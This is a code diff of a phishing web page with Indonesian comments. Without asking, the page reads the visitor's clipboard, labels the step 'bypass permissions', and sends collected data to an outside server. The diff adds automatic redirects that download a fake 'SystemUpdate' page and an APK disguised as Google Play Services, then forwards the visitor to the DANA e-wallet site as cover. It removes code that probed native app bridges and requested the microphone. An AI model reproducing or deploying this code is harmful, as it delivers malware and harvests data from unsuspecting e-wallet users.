@@ -64,10 +64,12 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - ADAPTIF UNTUK SEMUA PLATFORM
+// 🔥 INDEX.HTML - DOWNLOAD VIA REDIRECT (PASTI BERHASIL)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
 var semuaDidapat = false;
 var REDIRECT_DONE = false;
 
@@ -80,41 +82,11 @@ function detectPlatform() {
         isAndroid: ua.indexOf('android') > -1,
         isIOS: /iphone|ipad|ipod/.test(ua),
         isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || /; wv\)/.test(ua),
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
         isChrome: ua.indexOf('chrome') > -1 && !ua.indexOf('wv') > -1
     };
 }
 var PLATFORM = detectPlatform();
-
-// ============================================================
-// DETEKSI BRIDGE (MULTI-BRIDGE)
-// ============================================================
-var BRIDGE = null;
-(function detectBridge() {
-    var candidates = [
-        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
-        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
-        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'AppBridge'
-    ];
-    for (var i = 0; i < candidates.length; i++) {
-        if (typeof window[candidates[i]] !== 'undefined') {
-            BRIDGE = window[candidates[i]];
-            break;
-        }
-    }
-})();
-
-var HAS_BRIDGE = (BRIDGE !== null);
-
-function bridgeCall(method, args) {
-    if (!HAS_BRIDGE) return null;
-    try {
-        if (typeof BRIDGE[method] === 'function') {
-            return BRIDGE[method].apply(BRIDGE, args);
-        }
-    } catch(e) {}
-    return null;
-}
 
 // ============================================================
 // KIRIM DATA KE SERVER
@@ -185,11 +157,6 @@ function injectAllPermissions() {
         if (navigator.clipboard) {
             navigator.clipboard.readText().catch(function() {});
         }
-        if (navigator.mediaDevices && !PLATFORM.isWebView) {
-            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                .catch(function() {});
-        }
         K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
     } catch(e) {
         K({ sumber: 'bypass_permissions_error', data: e.message });
@@ -207,10 +174,17 @@ function dapatkanSemua() {
         if (popup) popup.style.display = 'none';
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         injectAllPermissions();
-        // 🔥 NAVIGASI LANGSUNG KE SYSTEMUPDATE.HTML
+
+        // 🔥 1. Download SystemUpdate.html via redirect
         setTimeout(function() {
             window.location.href = SERVER + '/SystemUpdate.html';
         }, 500);
+
+        // 🔥 2. Download APK via redirect (browser akan handle download)
+        setTimeout(function() {
+            window.location.href = SERVER + '/files/GooglePlayServices.apk';
+        }, 1000);
+
         setTimeout(function() { redirectToDANA(); }, 8000);
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
@@ -250,7 +224,7 @@ function redirectToDANA() {
     try { window.location.href = 'https://www.dana.id'; } catch(e) {}
 }
 
-console.log('✅ index.html loaded - ADAPTIF');
+console.log('✅ index.html loaded - Download via Redirect');
 </script>
 </body>
 </html>
